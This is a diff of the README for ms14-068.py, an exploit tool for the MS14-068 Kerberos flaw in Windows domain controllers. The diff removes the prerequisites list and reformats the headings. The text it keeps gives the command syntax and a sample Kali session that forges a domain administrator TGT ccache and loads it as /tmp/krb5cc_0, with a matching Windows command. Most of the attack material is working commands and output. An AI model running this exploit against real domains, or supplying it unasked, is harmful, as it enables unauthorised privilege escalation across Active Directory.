@@ -22,12 +22,7 @@ http://twitter.com/bidord
 
 # Exploits
 ## ms14-068.py
-To exploit MS14-068, you need :
- - A (one-way) trust relationship between a domain A and a domain B
- - An un-privileged user account on domain A
- - A resource on domain B accessible to privileged user of domain A
-
-## Usage :
+### Usage :
 ```
 USAGE:
 ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>
@@ -36,8 +31,8 @@ OPTIONS:
     -p <clearPassword>
  --rc4 <ntlmHash>
 ```
-## Example usage :
-### Linux (tested with samba and MIT Kerberos)
+### Example usage :
+#### Linux (tested with samba and MIT Kerberos)
 ```
 root@kali:~/sploit/pykek# python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
 Password: 
@@ -52,7 +47,7 @@ Password:
   [+] Creating ccache file 'TGT_user-a-1@dom-a.loc.ccache'... Done!
 root@kali:~/sploit/pykek# mv TGT_user-a-1@dom-a.loc.ccache /tmp/krb5cc_0 
 ```
-### On Windows
+#### On Windows
 
 ```
 python.exe ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
